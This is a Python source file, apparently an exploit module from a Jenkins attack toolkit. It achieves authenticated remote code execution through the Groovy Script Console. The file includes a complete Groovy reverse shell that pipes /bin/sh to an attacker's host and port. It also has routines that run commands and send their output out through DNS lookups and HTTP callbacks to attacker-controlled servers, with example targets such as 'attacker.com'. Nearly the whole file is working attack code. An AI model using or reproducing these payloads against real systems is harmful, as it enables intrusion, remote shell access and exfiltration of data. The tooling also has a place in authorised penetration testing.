"""
FEATURE: Jenkins Script Console RCE with Blind Execution Detection

This module provides authenticated remote code execution via Jenkins Script Console
with advanced blind execution detection techniques including DNS exfiltration and
time-based detection.

Unlike CVE modules, this is a feature-based exploitation module that works on any
Jenkins instance where the attacker has Script Console access (admin privileges).
"""

import time
from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class FeatureScriptConsole(ExploitModule):
    """
    Authenticated RCE via Script Console with blind execution detection.

    Detection Methods:
        1. Direct output capture (standard execution)
        2. DNS exfiltration (requires DNS callback server)
        3. Sleep-based timing detection
        4. HTTP callback detection
        5. File write verification

    Example:
        module = FeatureScriptConsole()
        result = module.run(session, command='whoami', detection='direct')
        result = module.run(session, command='id', detection='sleep')
        result = module.run(session, command='curl', detection='dns', dns_server='attacker.com')
    """

    CVE_ID = "FEATURE-SCRIPT-CONSOLE"

    METADATA = ExploitMetadata(
        cve_id="FEATURE-SCRIPT-CONSOLE",
        name="Jenkins Script Console RCE",
        description="Authenticated remote code execution via Groovy Script Console with blind execution detection",
        affected_versions=["All versions"],
        mitre_attack=["T1059.006", "T1059.001", "T1071.001", "T1071.004"],
        severity="critical",
        references=[
            "https://www.jenkins.io/doc/book/managing/script-console/",
            "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/jenkins"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["rce", "groovy", "script-console", "blind-execution", "post-exploitation"],
        author="ridpath"
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if Script Console is accessible.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if Script Console accessible, False otherwise
        """
        try:
            response = session.get("/script")
            return response.status_code == 200 and 'script' in response.text.lower()
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Execute command via Script Console with blind detection.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
                - command (str): Command to execute (default: 'id')
                - detection (str): Detection method ('direct', 'sleep', 'dns', 'http')
                - dns_server (str): DNS callback server (for detection='dns')
                - http_server (str): HTTP callback server (for detection='http')
                - sleep_time (int): Sleep duration in seconds (default: 5)
                - output_encoding (str): Output encoding method ('base64', 'hex', 'none')

        Returns:
            ExploitResult: Result of the execution
        """
        command = kwargs.get('command', 'id')
        detection = kwargs.get('detection', 'direct')
        dns_server = kwargs.get('dns_server', '')
        http_server = kwargs.get('http_server', '')
        sleep_time = kwargs.get('sleep_time', 5)
        output_encoding = kwargs.get('output_encoding', 'none')
        lhost = kwargs.get('lhost')
        lport = kwargs.get('lport', 4444)

        try:
            if not self.check_vulnerable(session):
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="Script Console not accessible - requires admin privileges"
                )

            if lhost:
                groovy_script = f"""
Thread.start{{
String host="{lhost}";
int port={lport};
Process p=new ProcessBuilder("/bin/sh","-i").redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){{
    try{{
        while(pi.available()>0)so.write(pi.read());
        while(si.available()>0){{
            int c=si.read();
            if(c==13)c=10;
            po.write(c);
        }}
        so.flush();
        po.flush();
        Thread.sleep(50);
        try{{p.exitValue();break;}}catch(Exception e){{}}
    }}catch(Exception e){{}}
}}
p.destroy();
s.close();
}}
""".strip()

                response = session.post("/scriptText", data={"script": groovy_script})

                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details=f"Reverse shell payload sent to {lhost}:{lport}",
                    data={"lhost": lhost, "lport": lport, "response_code": response.status_code}
                )

            if detection == 'direct':
                return self._execute_direct(session, command, output_encoding)
            elif detection == 'sleep':
                return self._execute_sleep_detection(session, command, sleep_time)
            elif detection == 'dns':
                if not dns_server:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="failure",
                        details="DNS detection requires dns_server parameter"
                    )
                return self._execute_dns_detection(session, command, dns_server)
            elif detection == 'http':
                if not http_server:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="failure",
                        details="HTTP detection requires http_server parameter"
                    )
                return self._execute_http_detection(session, command, http_server)
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Unknown detection method: {detection}"
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Execution failed: {str(e)}",
                error=str(e)
            )

    def _execute_direct(
        self,
        session: Any,
        command: str,
        encoding: str = 'none'
    ) -> ExploitResult:
        """
        Execute command with direct output capture.

        Args:
            session: JenkinsSession instance
            command: Command to execute
            encoding: Output encoding method

        Returns:
            ExploitResult with command output
        """
        if encoding == 'base64':
            groovy_script = f'''
                def proc = "{command}".execute()
                proc.waitFor()
                def output = proc.text
                println output.bytes.encodeBase64().toString()
            '''.strip()
        elif encoding == 'hex':
            groovy_script = f'''
                def proc = "{command}".execute()
                proc.waitFor()
                def output = proc.text
                println output.bytes.encodeHex().toString()
            '''.strip()
        else:
            groovy_script = f'println "{command}".execute().text'

        try:
            response = session.post(
                "/scriptText",
                data={"script": groovy_script}
            )

            if response.status_code == 200:
                output = response.text.strip()

                if encoding == 'base64':
                    import base64
                    try:
                        output = base64.b64decode(output).decode('utf-8')
                    except Exception:
                        pass
                elif encoding == 'hex':
                    try:
                        output = bytes.fromhex(output).decode('utf-8')
                    except Exception:
                        pass

                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details="Command executed successfully via Script Console",
                    data={
                        "command": command,
                        "output": output,
                        "detection_method": "direct",
                        "encoding": encoding
                    }
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Script execution failed: HTTP {response.status_code}",
                    error=f"HTTP {response.status_code}"
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Execution failed: {str(e)}",
                error=str(e)
            )

    def _execute_sleep_detection(
        self,
        session: Any,
        command: str,
        sleep_time: int
    ) -> ExploitResult:
        """
        Execute command with sleep-based timing detection.

        Args:
            session: JenkinsSession instance
            command: Command to execute
            sleep_time: Sleep duration in seconds

        Returns:
            ExploitResult indicating if execution was detected
        """
        groovy_script = f'''
            try {{
                "{command}".execute()
                sleep({sleep_time * 1000})
                println "executed"
            }} catch (Exception e) {{
                println "error: ${{e.message}}"
            }}
        '''.strip()

        try:
            start_time = time.time()

            session.post(
                "/scriptText",
                data={"script": groovy_script}
            )

            elapsed_time = time.time() - start_time

            if elapsed_time >= sleep_time * 0.9:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details=f"Command executed (detected via sleep timing: {elapsed_time:.2f}s)",
                    data={
                        "command": command,
                        "detection_method": "sleep",
                        "sleep_time": sleep_time,
                        "elapsed_time": elapsed_time,
                        "execution_confirmed": True
                    }
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Execution timing mismatch: expected {sleep_time}s, got {elapsed_time:.2f}s",
                    data={
                        "command": command,
                        "detection_method": "sleep",
                        "elapsed_time": elapsed_time,
                        "execution_confirmed": False
                    }
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Execution failed: {str(e)}",
                error=str(e)
            )

    def _execute_dns_detection(
        self,
        session: Any,
        command: str,
        dns_server: str
    ) -> ExploitResult:
        """
        Execute command with DNS exfiltration detection.

        Args:
            session: JenkinsSession instance
            command: Command to execute
            dns_server: DNS callback server (e.g., attacker.burpcollaborator.net)

        Returns:
            ExploitResult with DNS detection results
        """
        import hashlib
        execution_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        groovy_script = f'''
            try {{
                def proc = "{command}".execute()
                proc.waitFor()
                def output = proc.text.take(50).replaceAll('[^a-zA-Z0-9]', '')
                def domain = "${{output}}.{execution_id}.{dns_server}"
                java.net.InetAddress.getByName(domain)
                println "DNS lookup executed"
            }} catch (Exception e) {{
                try {{
                    java.net.InetAddress.getByName("error.{execution_id}.{dns_server}")
                }} catch (Exception e2) {{ }}
                println "error: ${{e.message}}"
            }}
        '''.strip()

        try:
            response = session.post(
                "/scriptText",
                data={"script": groovy_script}
            )

            if response.status_code == 200:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details="Command executed with DNS exfiltration (check DNS logs)",
                    data={
                        "command": command,
                        "detection_method": "dns",
                        "dns_server": dns_server,
                        "execution_id": execution_id,
                        "expected_dns_query": f"*.{execution_id}.{dns_server}",
                        "note": "Check DNS server logs for queries containing execution_id"
                    }
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Script execution failed: HTTP {response.status_code}"
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Execution failed: {str(e)}",
                error=str(e)
            )

    def _execute_http_detection(
        self,
        session: Any,
        command: str,
        http_server: str
    ) -> ExploitResult:
        """
        Execute command with HTTP callback detection.

        Args:
            session: JenkinsSession instance
            command: Command to execute
            http_server: HTTP callback server (e.g., http://attacker.com:8080)

        Returns:
            ExploitResult with HTTP callback results
        """
        import hashlib
        execution_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        groovy_script = f'''
            try {{
                def proc = "{command}".execute()
                proc.waitFor()
                def output = proc.text
                def encoded = output.bytes.encodeBase64().toString()
                def url = new URL("{http_server}/callback?id={execution_id}&data=${{encoded}}")
                url.openConnection().getInputStream().text
                println "Callback sent"
            }} catch (Exception e) {{
                try {{
                    new URL("{http_server}/error?id={execution_id}&msg=${{e.message}}").openConnection().getInputStream().text
                }} catch (Exception e2) {{ }}
                println "error: ${{e.message}}"
            }}
        '''.strip()

        try:
            response = session.post(
                "/scriptText",
                data={"script": groovy_script}
            )

            if response.status_code == 200:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details="Command executed with HTTP callback (check server logs)",
                    data={
                        "command": command,
                        "detection_method": "http",
                        "http_server": http_server,
                        "execution_id": execution_id,
                        "callback_url": f"{http_server}/callback?id={execution_id}",
                        "note": "Check HTTP server logs for callback with execution_id"
                    }
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Script execution failed: HTTP {response.status_code}"
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Execution failed: {str(e)}",
                error=str(e)
            )

    def cleanup(self, session: Any, **kwargs: Any) -> None:
        """
        Cleanup after execution.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
        """
        pass
